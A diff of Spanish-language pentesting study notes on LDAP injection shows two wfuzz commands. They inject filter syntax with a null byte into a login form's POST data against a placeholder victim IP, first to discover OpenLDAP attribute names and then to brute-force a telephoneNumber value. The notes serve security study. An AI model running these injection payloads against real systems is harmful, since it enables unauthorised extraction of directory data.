@@ -17,4 +17,6 @@ Para eso usaremos [[WFUZZ]]
 `wfuzz -c -w /home/jalag/Workzone/Herramientas/Wordlists/Seclist/Fuzzing/LDAP-openldap-attributes.txt -d 'user_id=admin)(FUZZ))%00&password=*&login=1&submit=Submit' http://<IP_Victima>` 
 ###### Desde la parte de 'user_id ....' Es el dato enviado por POST en BurpSuite
 
-Una vez obtenido por ejemplo el atributo de 
+Una vez obtenido por ejemplo el atributo de `telefoneNumber` podemos descubrir cual es el valor que se aloja en el, podemos seguir usando [[WFUZZ]]
+`wfuzz -c --hh=439 -z range,0-9 -d 'user_id=jalag)(telephoneNumber=FUZZ*))%00&password=*&login=1&submit=Submit' http://<IP_Victima>`
+
